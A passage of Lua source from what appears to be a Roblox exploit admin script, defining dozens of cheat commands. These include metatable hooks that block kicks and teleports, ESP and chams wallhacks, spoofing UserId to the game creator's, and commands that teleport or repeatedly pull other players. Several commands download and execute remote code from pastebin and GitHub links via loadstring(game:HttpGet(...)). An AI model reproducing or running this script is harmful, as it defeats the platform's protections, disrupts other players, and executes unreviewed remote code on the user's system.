		notify('Incompatible Exploit','Your exploit does not support this command (missing saveinstance)')
	end
end)


addcmd('clearerror',{'clearerrors'},function(args, speaker)
	game:GetService("GuiService"):ClearError()
end)

addcmd('clientantikick',{'antikick'},function(args, speaker)
	local mt = getrawmetatable(game)
	local old = mt.__namecall
	local protect = newcclosure or protect_function

	if not protect then
		notify("Incompatible Exploit Warning", "Your exploit does not support protection against stack trace errors, resulting to fallback function")
		protect = function(f) return f end
	end

	setreadonly(mt, false)
	mt.__namecall = protect(function(self, ...)
		local method = getnamecallmethod()
		if method == "Kick" then
			wait(9e9)
			return
		end
		return old(self, ...)
	end)
	hookfunction(Players.LocalPlayer.Kick,protect(function() wait(9e9) end))

	notify('Client Antikick','Client anti kick is now active (only effective on localscript kick)')
end)

allow_rj = true
addcmd('clientantiteleport',{'antiteleport'},function(args, speaker)
	local TeleportService, tp, tptpi = game:GetService("TeleportService")
	tp = hookfunction(TeleportService.Teleport, function(id, ...)
		if allow_rj and id == game.Placeid then
			return tp(id, ...)
		end
		return wait(9e9)
	end)
	tptpi = hookfunction(TeleportService.TeleportToPlaceInstance, function(id, server, ...)
		if allow_rj and id == game.Placeid and server == game.JobId then
			return tp(id, server, ...)
		end
		return wait(9e9)
	end)

	notify('Client AntiTP','Client anti teleport is now active (only effective on localscript teleport)')
end)

addcmd('allowrejoin',{'allowrj'},function(args, speaker)
	if args[1] and args[1] == 'false' then
		allow_rj = false
		notify('Client AntiTP','Allow rejoin set to false')
	else
		allow_rj = true
		notify('Client AntiTP','Allow rejoin set to true')
	end
end)

addcmd('volume',{'vol'},function(args, speaker)
	local level = args[1]/10
	UserSettings():GetService("UserGameSettings").MasterVolume = level
end)

addcmd('antilag',{'al','nl'},function(args, speaker)
	workspace:FindFirstChildOfClass('Terrain').WaterWaveSize = 0
	workspace:FindFirstChildOfClass('Terrain').WaterWaveSpeed = 0
	workspace:FindFirstChildOfClass('Terrain').WaterReflectance = 0
	workspace:FindFirstChildOfClass('Terrain').WaterTransparency = 0
	game:GetService("Lighting").GlobalShadows = false
	game:GetService("Lighting").FogEnd = 9e9
	settings().Rendering.QualityLevel = 1
	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
			v.Material = "Plastic"
			v.Reflectance = 0
		elseif v:IsA("Decal") then
			v.Transparency = 1
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v.Lifetime = NumberRange.new(0)
		elseif v:IsA("Explosion") then
			v.BlastPressure = 1
			v.BlastRadius = 1
		end
	end
	for i,v in pairs(game:GetService("Lighting"):GetDescendants()) do
		if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
			v.Enabled = false
		end
	end
end)

addcmd("setfpscap", {"fpscap", "maxfps"}, function(args, speaker)
	if setfpscap and type(setfpscap) == "function" then
		local num = args[1] or 1e6
		if num == 'none' then
			return setfpscap(1e6)
		elseif num > 0 then
			return setfpscap(num)
		else
			return notify("Invalid argument", "Please provide a number above 0 or 'none'.")
		end
	else
		return notify("Incompatible Exploit", "Your exploit does not support this command (missing setfpscap)")
	end
end)

addcmd('notify',{},function(args, speaker)
	notify(getstring(1))
end)

addcmd('lastcommand',{'lastcmd'},function(args, speaker)
	if cmdHistory[2]:sub(1,11) ~= 'lastcommand' and cmdHistory[2]:sub(1,7) ~= 'lastcmd' then
		execCmd(cmdHistory[2])
	end
end)

addcmd('esp',{},function(args, speaker)
	if not CHMSenabled then
		ESPenabled = true
		for i,v in pairs(Players:GetChildren()) do
			if v.ClassName == "Player" and v.Name ~= speaker.Name then
				ESP(v)
			end
		end
	else
		notify('ESP','Disable chams (nochams) before using esp')
	end
end)

addcmd('noesp',{'unesp'},function(args, speaker)
	ESPenabled = false
	for i,c in pairs(COREGUI:GetChildren()) do
		if string.sub(c.Name, -4) == '_ESP' then
			c:Destroy()
		end
	end
end)

local espParts = {}
local partEspTrigger = nil
function partAdded(part)
	if #espParts > 0 then
		if FindInTable(espParts,part.Name:lower()) then
			local a = Instance.new("BoxHandleAdornment")
			a.Name = part.Name:lower().."_PESP"
			a.Parent = part
			a.Adornee = part
			a.AlwaysOnTop = true
			a.ZIndex = 0
			a.Size = part.Size
			a.Transparency = 0.3
			a.Color = BrickColor.new("Lime green")
		end
	else
		partEspTrigger:Disconnect()
		partEspTrigger = nil
	end
end

addcmd('partesp',{},function(args, speaker)
	local partEspName = getstring(1):lower()
	if not FindInTable(espParts,partEspName) then
		table.insert(espParts,partEspName)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and v.Name:lower() == partEspName then
				local a = Instance.new("BoxHandleAdornment")
				a.Name = partEspName.."_PESP"
				a.Parent = v
				a.Adornee = v
				a.AlwaysOnTop = true
				a.ZIndex = 0
				a.Size = v.Size
				a.Transparency = 0.3
				a.Color = BrickColor.new("Lime green")
			end
		end
	end
	if partEspTrigger == nil then
		partEspTrigger = workspace.DescendantAdded:Connect(partAdded)
	end
end)

addcmd('unpartesp',{'nopartesp'},function(args, speaker)
	if args[1] then
		local partEspName = getstring(1):lower()
		if FindInTable(espParts,partEspName) then
			table.remove(espParts, GetInTable(espParts, partEspName))
		end
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BoxHandleAdornment") and v.Name == partEspName..'_PESP' then
				v:Destroy()
			end
		end
	else
		partEspTrigger:Disconnect()
		partEspTrigger = nil
		espParts = {}
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BoxHandleAdornment") and v.Name:sub(-5) == '_PESP' then
				v:Destroy()
			end
		end
	end
end)

addcmd('chams',{},function(args, speaker)
	if not ESPenabled then
		CHMSenabled = true
		for i,v in pairs(Players:GetChildren()) do
			if v.ClassName == "Player" and v.Name ~= speaker.Name then
				CHMS(v)
			end
		end
	else
		notify('Chams','Disable ESP (noesp) before using chams')
	end
end)

addcmd('nochams',{'unchams'},function(args, speaker)
	CHMSenabled = false
	for i,v in pairs(Players:GetChildren()) do
		local chmsplr = v
		for i,c in pairs(COREGUI:GetChildren()) do
			if c.Name == chmsplr.Name..'_CHMS' then
				c:Destroy()
			end
		end
	end
end)

addcmd('locate',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		Locate(Players[v])
	end
end)

addcmd('nolocate',{'unlocate'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if args[1] then
		for i,v in pairs(players) do
			for i,c in pairs(COREGUI:GetChildren()) do
				if c.Name == Players[v].Name..'_LC' then
					c:Destroy()
				end
			end
		end
	else
		for i,c in pairs(COREGUI:GetChildren()) do
			if string.sub(c.Name, -3) == '_LC' then
				c:Destroy()
			end
		end
	end
end)

viewing = nil
addcmd('view',{'spectate'},function(args, speaker)
	StopFreecam()
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if viewDied then
			viewDied:Disconnect()
			viewChanged:Disconnect()
		end
		viewing = Players[v]
		workspace.CurrentCamera.CameraSubject = viewing.Character
		notify('Spectate','Viewing ' .. Players[v].Name)
		local function viewDiedFunc()
			repeat wait() until Players[v].Character ~= nil and getRoot(Players[v].Character)
			workspace.CurrentCamera.CameraSubject = viewing.Character
		end
		viewDied = Players[v].CharacterAdded:Connect(viewDiedFunc)
		local function viewChangedFunc()
			workspace.CurrentCamera.CameraSubject = viewing.Character
		end
		viewChanged = workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)
	end
end)

addcmd('viewpart',{'viewp'},function(args, speaker)
	StopFreecam()
	if args[1] then
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
				wait(0.1)
				workspace.CurrentCamera.CameraSubject = v
			end
		end
	end
end)

addcmd('unview',{'unspectate'},function(args, speaker)
	StopFreecam()
	if viewing ~= nil then
		viewing = nil
		notify('Spectate','View turned off')
	end
	if viewDied then
		viewDied:Disconnect()
		viewChanged:Disconnect()
	end
	workspace.CurrentCamera.CameraSubject = speaker.Character
end)


fcRunning = false
local Camera = workspace.CurrentCamera
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
	local newCamera = workspace.CurrentCamera
	if newCamera then
		Camera = newCamera
	end
end)

local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value

Spring = {} do
	Spring.__index = Spring

	function Spring.new(freq, pos)
		local self = setmetatable({}, Spring)
		self.f = freq
		self.p = pos
		self.v = pos*0
		return self
	end

	function Spring:Update(dt, goal)
		local f = self.f*2*math.pi
		local p0 = self.p
		local v0 = self.v

		local offset = goal - p0
		local decay = math.exp(-f*dt)

		local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
		local v1 = (f*dt*(offset*f - v0) + v0)*decay

		self.p = p1
		self.v = v1

		return p1
	end

	function Spring:Reset(pos)
		self.p = pos
		self.v = pos*0
	end
end

local cameraPos = Vector3.new()
local cameraRot = Vector2.new()

local velSpring = Spring.new(5, Vector3.new())
local panSpring = Spring.new(5, Vector2.new())

Input = {} do

	keyboard = {
		W = 0,
		A = 0,
		S = 0,
		D = 0,
		E = 0,
		Q = 0,
		Up = 0,
		Down = 0,
		LeftShift = 0,
	}

	mouse = {
		Delta = Vector2.new(),
	}

	NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
	PAN_MOUSE_SPEED = Vector2.new(1, 1)*(math.pi/64)
	NAV_ADJ_SPEED = 0.75
	NAV_SHIFT_MUL = 0.25

	navSpeed = 1

	function Input.Vel(dt)
		navSpeed = math.clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

		local kKeyboard = Vector3.new(
			keyboard.D - keyboard.A,
			keyboard.E - keyboard.Q,
			keyboard.S - keyboard.W
		)*NAV_KEYBOARD_SPEED

		local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift)

		return (kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
	end

	function Input.Pan(dt)
		local kMouse = mouse.Delta*PAN_MOUSE_SPEED
		mouse.Delta = Vector2.new()
		return kMouse
	end

	do
		function Keypress(action, state, input)
			keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
			return Enum.ContextActionResult.Sink
		end

		function MousePan(action, state, input)
			local delta = input.Delta
			mouse.Delta = Vector2.new(-delta.y, -delta.x)
			return Enum.ContextActionResult.Sink
		end

		function Zero(t)
			for k, v in pairs(t) do
				t[k] = v*0
			end
		end

		function Input.StartCapture()
			game:GetService("ContextActionService"):BindActionAtPriority("FreecamKeyboard",Keypress,false,INPUT_PRIORITY,
			Enum.KeyCode.W,
			Enum.KeyCode.A,
			Enum.KeyCode.S,
			Enum.KeyCode.D,
			Enum.KeyCode.E,
			Enum.KeyCode.Q,
			Enum.KeyCode.Up,
			Enum.KeyCode.Down
			)
			game:GetService("ContextActionService"):BindActionAtPriority("FreecamMousePan",MousePan,false,INPUT_PRIORITY,Enum.UserInputType.MouseMovement)
		end

		function Input.StopCapture()
			navSpeed = 1
			Zero(keyboard)
			Zero(mouse)
			game:GetService("ContextActionService"):UnbindAction("FreecamKeyboard")
			game:GetService("ContextActionService"):UnbindAction("FreecamMousePan")
		end
	end
end

function GetFocusDistance(cameraFrame)
	local znear = 0.1
	local viewport = Camera.ViewportSize
	local projy = 2*math.tan(cameraFov/2)
	local projx = viewport.x/viewport.y*projy
	local fx = cameraFrame.rightVector
	local fy = cameraFrame.upVector
	local fz = cameraFrame.lookVector

	local minVect = Vector3.new()
	local minDist = 512

	for x = 0, 1, 0.5 do
		for y = 0, 1, 0.5 do
			local cx = (x - 0.5)*projx
			local cy = (y - 0.5)*projy
			local offset = fx*cx - fy*cy + fz
			local origin = cameraFrame.p + offset*znear
			local _, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
			local dist = (hit - origin).magnitude
			if minDist > dist then
				minDist = dist
				minVect = offset.unit
			end
		end
	end

	return fz:Dot(minVect)*minDist
end

local function StepFreecam(dt)
	local vel = velSpring:Update(dt, Input.Vel(dt))
	local pan = panSpring:Update(dt, Input.Pan(dt))

	local zoomFactor = math.sqrt(math.tan(math.rad(70/2))/math.tan(math.rad(cameraFov/2)))

	cameraRot = cameraRot + pan*Vector2.new(0.75, 1)*8*(dt/zoomFactor)
	cameraRot = Vector2.new(math.clamp(cameraRot.x, -math.rad(90), math.rad(90)), cameraRot.y%(2*math.pi))

	local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*Vector3.new(1, 1, 1)*64*dt)
	cameraPos = cameraCFrame.p

	Camera.CFrame = cameraCFrame
	Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
	Camera.FieldOfView = cameraFov
end

local PlayerState = {} do
	mouseBehavior = ""
	mouseIconEnabled = ""
	cameraType = ""
	cameraFocus = ""
	cameraCFrame = ""
	cameraFieldOfView = ""

	function PlayerState.Push()
		cameraFieldOfView = Camera.FieldOfView
		Camera.FieldOfView = 70

		cameraType = Camera.CameraType
		Camera.CameraType = Enum.CameraType.Custom

		cameraCFrame = Camera.CFrame
		cameraFocus = Camera.Focus

		mouseIconEnabled = UserInputService.MouseIconEnabled
		UserInputService.MouseIconEnabled = true

		mouseBehavior = UserInputService.MouseBehavior
		UserInputService.MouseBehavior = Enum.MouseBehavior.Default
	end

	function PlayerState.Pop()
		Camera.FieldOfView = 70

		Camera.CameraType = cameraType
		cameraType = nil

		Camera.CFrame = cameraCFrame
		cameraCFrame = nil

		Camera.Focus = cameraFocus
		cameraFocus = nil

		UserInputService.MouseIconEnabled = mouseIconEnabled
		mouseIconEnabled = nil

		UserInputService.MouseBehavior = mouseBehavior
		mouseBehavior = nil
	end
end

function StartFreecam(pos)
	if fcRunning then
		StopFreecam()
	end
	local cameraCFrame = Camera.CFrame
	if pos then
		cameraCFrame = pos
	end
	cameraRot = Vector2.new()
	cameraPos = cameraCFrame.p
	cameraFov = Camera.FieldOfView

	velSpring:Reset(Vector3.new())
	panSpring:Reset(Vector2.new())

	PlayerState.Push()
	game:GetService("RunService"):BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
	Input.StartCapture()
	fcRunning = true
end

function StopFreecam()
	if not fcRunning then return end
	Input.StopCapture()
	game:GetService("RunService"):UnbindFromRenderStep("Freecam")
	PlayerState.Pop()
	workspace.Camera.FieldOfView = 70
	fcRunning = false
end

addcmd('freecam',{'fc'},function(args, speaker)
	StartFreecam()
end)

addcmd('freecampos',{'fcpos','fcp','freecamposition','fcposition'},function(args, speaker)
	if not args[1] then return end
	local freecamPos = CFrame.new(args[1],args[2],args[3])
	StartFreecam(freecamPos)
end)

addcmd('freecamwaypoint',{'fcwp'},function(args, speaker)
	local WPName = tostring(getstring(1))
	if speaker.Character then
		for i,_ in pairs(WayPoints) do
			local x = WayPoints[i].COORD[1]
			local y = WayPoints[i].COORD[2]
			local z = WayPoints[i].COORD[3]
			if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
				StartFreecam(CFrame.new(x,y,z))
			end
		end
		for i,_ in pairs(pWayPoints) do
			if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
				StartFreecam(CFrame.new(pWayPoints[i].COORD[1].Position))
			end
		end
	end
end)

addcmd('freecamgoto',{'fcgoto','freecamtp','fctp'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		StartFreecam(getRoot(Players[v].Character).CFrame)
	end
end)

addcmd('unfreecam',{'nofreecam','unfc','nofc'},function(args, speaker)
	StopFreecam()
end)

addcmd('freecamspeed',{'fcspeed'},function(args, speaker)
	local FCspeed = args[1] or 1
	if isNumber(FCspeed) then
		NAV_KEYBOARD_SPEED = Vector3.new(FCspeed, FCspeed, FCspeed)
	end
end)

addcmd('gotocamera',{'gotocam','tocam'},function(args, speaker)
	getRoot(speaker.Character).CFrame = workspace.Camera.CFrame
end)

addcmd('tweengotocamera',{'tweengotocam','tgotocam','ttocam'},function(args, speaker)
	game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = workspace.Camera.CFrame}):Play()
end)

addcmd('fov',{},function(args, speaker)
	local fov = args[1] or 70
	if isNumber(fov) then
		workspace.CurrentCamera.FieldOfView = fov
	end
end)

local preMaxZoom = Players.LocalPlayer.CameraMaxZoomDistance
local preMinZoom = Players.LocalPlayer.CameraMinZoomDistance
addcmd('lookat',{},function(args, speaker)
	if speaker.CameraMaxZoomDistance ~= 0.5 then
		preMaxZoom = speaker.CameraMaxZoomDistance
		preMinZoom = speaker.CameraMinZoomDistance
	end
	speaker.CameraMaxZoomDistance = 0.5
	speaker.CameraMinZoomDistance = 0.5
	wait()
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		local target = Players[v].Character
		if target and target:FindFirstChild('Head') then
			workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.p, target.Head.CFrame.p)
			wait(0.1)
		end
	end
	speaker.CameraMaxZoomDistance = preMaxZoom
	speaker.CameraMinZoomDistance = preMinZoom
end)

addcmd('fixcam',{'restorecam'},function(args, speaker)
	StopFreecam()
	execCmd('unview')
	workspace.CurrentCamera:remove()
	wait(.1)
	repeat wait() until speaker.Character ~= nil
	workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
	workspace.CurrentCamera.CameraType = "Custom"
	speaker.CameraMinZoomDistance = 0.5
	speaker.CameraMaxZoomDistance = 400
	speaker.CameraMode = "Classic"
	speaker.Character.Head.Anchored = false
end)

addcmd('enableshiftlock',{'enablesl','shiftlock'},function(args, speaker)
	speaker.DevEnableMouseLock = true
	notify('Shiftlock','Shift lock is now available')
end)

addcmd('firstp',{},function(args, speaker)
	speaker.CameraMode = "LockFirstPerson"
end)

addcmd('thirdp',{},function(args, speaker)
	speaker.CameraMode = "Classic"
end)

addcmd('noclipcam',{'nccam'},function(args, speaker)
	speaker.CameraMinZoomDistance = math.huge - math.huge
	speaker.CameraMaxZoomDistance = math.huge - math.huge
end)


addcmd('maxzoom',{},function(args, speaker)
	speaker.CameraMaxZoomDistance = args[1]
end)

addcmd('minzoom',{},function(args, speaker)
	speaker.CameraMinZoomDistance = args[1]
end)

addcmd('Antifling',{'af'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/nxKqVG8V"))()
	notify('Antifling Loaded','Hat flings wont work unless they use their spinning body')
end) 

addcmd('RTX',{'HighGFX'},function(args, speaker) 
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Jujutsoo/adsafd/2f374ff814f66de79bf0dffd367da6d10b7de336/dd"))()
end)

addcmd('delete',{'remove'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() then
			v:Destroy()
		end
	end
	notify('Item(s) Deleted','Deleted ' ..getstring(1))
end)

addcmd('deleteclass',{'removeclass','deleteclassname','removeclassname','dc'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.ClassName:lower() == getstring(1):lower() then
			v:Destroy()
		end
	end
	notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
end)

addcmd('chardelete',{'charremove','cd'},function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() then
			v:Destroy()
		end
	end
	notify('Item(s) Deleted','Deleted ' ..getstring(1))
end)

addcmd('chardeleteclass',{'charremoveclass','chardeleteclassname','charremoveclassname','cdc'},function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v.ClassName:lower() == getstring(1):lower() then
			v:Destroy()
		end
	end
	notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
end)

addcmd('deletevelocity',{'dv','removevelocity','removeforces'},function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
			v:Destroy()
		end
	end
end)

addcmd('deleteinvisparts',{'deleteinvisibleparts','dip'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Transparency == 1 and v.CanCollide then
			v:Destroy()
		end
	end
end)

local shownParts = {}
addcmd('invisibleparts',{'invisparts'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Transparency == 1 then
			if not table.find(shownParts,v) then
				table.insert(shownParts,v)
			end
			v.Transparency = 0
		end
	end
end)

addcmd('uninvisibleparts',{'uninvisparts'},function(args, speaker)
	for i,v in pairs(shownParts) do
		v.Transparency = 1
	end
	shownParts = {}
end)

addcmd('btools',{'bt'},function(args, speaker)
	Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 4
end)

addcmd('f3x',{'fex'},function(args, speaker)
	loadstring(game:GetObjects("rbxassetid://4698064966")[1].Source)()
end)

addcmd('partpath',{'partname'},function(args, speaker)
	selectPart()
end)

addcmd('antiafk',{'antiidle'},function(args, speaker)
	local GC = getconnections or get_signal_cons
	if GC then
		for i,v in pairs(GC(Players.LocalPlayer.Idled)) do
			if v["Disable"] then
				v["Disable"](v)
			elseif v["Disconnect"] then
				v["Disconnect"](v)
			end
		end
		notify('Anti Idle','Anti idle is enabled')
	else
		notify('Incompatible Exploit','Your exploit does not support this command (missing getconnections)')
	end
end)

addcmd('datalimit',{},function(args, speaker)
	if tonumber(args[1]) then
		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(args[1])
	end
end)

addcmd('replicationlag',{'backtrack'},function(args, speaker)
	if tonumber(args[1]) then
		settings():GetService("NetworkSettings").IncommingReplicationLag = args[1]
	end
end)

addcmd('noprompts',{'nopurchaseprompts'},function(args, speaker)
	COREGUI.PurchasePromptApp.PurchasePromptUI.Visible = false
	COREGUI.PurchasePromptApp.PremiumPromptUI.Visible = false
end)

addcmd('showprompts',{'showpurchaseprompts'},function(args, speaker)
	COREGUI.PurchasePromptApp.PurchasePromptUI.Visible = true
	COREGUI.PurchasePromptApp.PremiumPromptUI.Visible = false
end)

addcmd('age',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	local ages = {}
	for i,v in pairs(players) do
		local p = Players[v]
		table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
	end
	notify('Account Age',table.concat(ages, ',\n'))
end)

addcmd('chatage',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	local ages = {}
	for i,v in pairs(players) do
		local p = Players[v]
		table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
	end
	local chatString = table.concat(ages, ', ')
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatString, "All")
end)

addcmd('darkhub',{'dh'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/NL4qsnib"))()
end)

addcmd('chatjoindate',{'cjd'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	local dates = {}
	notify("Loading",'Hold on a sec')
	for i,v in pairs(players) do
		local user = game:HttpGet("https://users.roblox.com/v1/users/"..Players[v].UserId)
		local json = game:GetService("HttpService"):JSONDecode(user)
		local date = json["created"]:sub(1,10)
		local splitDates = string.split(date,"-")
		table.insert(dates,Players[v].Name.." joined: "..splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
	end
	local chatString = table.concat(dates, ', ')
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatString, "All")
end)

addcmd('copyname',{'copyuser'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		local name = tostring(Players[v].Name)
		toClipboard(name)
	end
end)

addcmd('userid',{'id'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		local id = tostring(Players[v].UserId)
		notify('User ID',id)
	end
end)

addcmd('copyid',{'copyuserid'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		local id = tostring(Players[v].UserId)
		toClipboard(id)
	end
end)

addcmd('creatorid',{'creator'},function(args, speaker)
	if game.CreatorType == Enum.CreatorType.User then
		notify('Creator ID',game.CreatorId)
	elseif game.CreatorType == Enum.CreatorType.Group then
		local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
		speaker.UserId = OwnerID
		notify('Creator ID',OwnerID)
	end
end)

addcmd('copycreatorid',{'copycreator'},function(args, speaker)
	if game.CreatorType == Enum.CreatorType.User then
		toClipboard(game.CreatorId)
		notify('Copied ID','Copied creator ID to clipboard')
	elseif game.CreatorType == Enum.CreatorType.Group then
		local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
		toClipboard(OwnerID)
		notify('Copied ID','Copied creator ID to clipboard')
	end
end)

addcmd('setcreatorid',{'setcreator'},function(args, speaker)
	if game.CreatorType == Enum.CreatorType.User then
		speaker.UserId = game.CreatorId
		notify('Set ID','Set UserId to '..game.CreatorId)
	elseif game.CreatorType == Enum.CreatorType.Group then
		local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
		speaker.UserId = OwnerID
		notify('Set ID','Set UserId to '..OwnerID)
	end
end)

addcmd('appearanceid',{'aid'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		local aid = tostring(Players[v].CharacterAppearanceId)
		notify('Appearance ID',aid)
	end
end)

addcmd('copyappearanceid',{'caid'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		local aid = tostring(Players[v].CharacterAppearanceId)
		toClipboard(aid)
	end
end)

addcmd('to',{'tp'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait(0.1)
			getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)
		end
	end
	execCmd('breakvelocity')
end)

addcmd('tweengoto',{'tgoto','tto','tweento'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait(0.1)
			game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)}):Play()
		end
	end
	execCmd('breakvelocity')
end)

addcmd('vehiclegoto',{'vgoto','vtp','vehicletp'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			local seat = speaker.Character.Humanoid.SeatPart
			local vehicleModel = seat.Parent
			repeat
				if vehicleModel.ClassName ~= "Model" then
					vehicleModel = vehicleModel.Parent
				end
			until vehicleModel.ClassName == "Model"
			wait(0.1)
			vehicleModel:MoveTo(getRoot(Players[v].Character).Position)
		end
	end
end)

local vnoclipParts = {}
addcmd('vehiclenoclip',{'vnoclip'},function(args, speaker)
	vnoclipParts = {}
	local seat = speaker.Character.Humanoid.SeatPart
	local vehicleModel = seat.Parent
	repeat
		if vehicleModel.ClassName ~= "Model" then
			vehicleModel = vehicleModel.Parent
		end
	until vehicleModel.ClassName == "Model"
	wait(0.1)
	execCmd('noclip')
	for i,v in pairs(vehicleModel:GetDescendants()) do
		if v:IsA("BasePart") and v.CanCollide then
			table.insert(vnoclipParts,v)
			v.CanCollide = false
		end
	end
end)

addcmd('vehicleclip',{'vclip','unvnoclip','unvehiclenoclip'},function(args, speaker)
	execCmd('clip')
	for i,v in pairs(vnoclipParts) do
		v.CanCollide = true
	end
	vnoclipParts = {}
end)

addcmd('togglevnoclip',{},function(args, speaker)
	if Clip then
		execCmd('vnoclip')
	else
		execCmd('vclip')
	end
end)

addcmd('clientbring',{'cbring'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			if Players[v].Character:FindFirstChild("Humanoid") then
				Players[v].Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait()
			getRoot(Players[v].Character).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(3,1,0)
		end
	end
end)

local bringT = {}
addcmd('loopbring',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			if Players[v].Name ~= speaker.Name and not FindInTable(bringT, Players[v].Name) then
				table.insert(bringT, Players[v].Name)
				local plrName = Players[v].Name
				local pchar=Players[v].Character
				local distance = 3
				if args[2] and isNumber(args[2]) then
					distance = args[2]
				end
				local lDelay = 0
				if args[3] and isNumber(args[3]) then
					lDelay = args[3]
				end
				repeat
					for i,c in pairs(players) do
						if Players:FindFirstChild(v) then
							pchar = Players[v].Character
							if pchar~= nil and Players[v].Character ~= nil and getRoot(pchar) and speaker.Character ~= nil and getRoot(speaker.Character) then
								getRoot(pchar).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(distance,1,0)
							end
							wait(lDelay)
						else 
							for a,b in pairs(bringT) do if b == plrName then table.remove(bringT, a) end end
						end
					end
				until not FindInTable(bringT, plrName)
			end
		end)
	end
end)

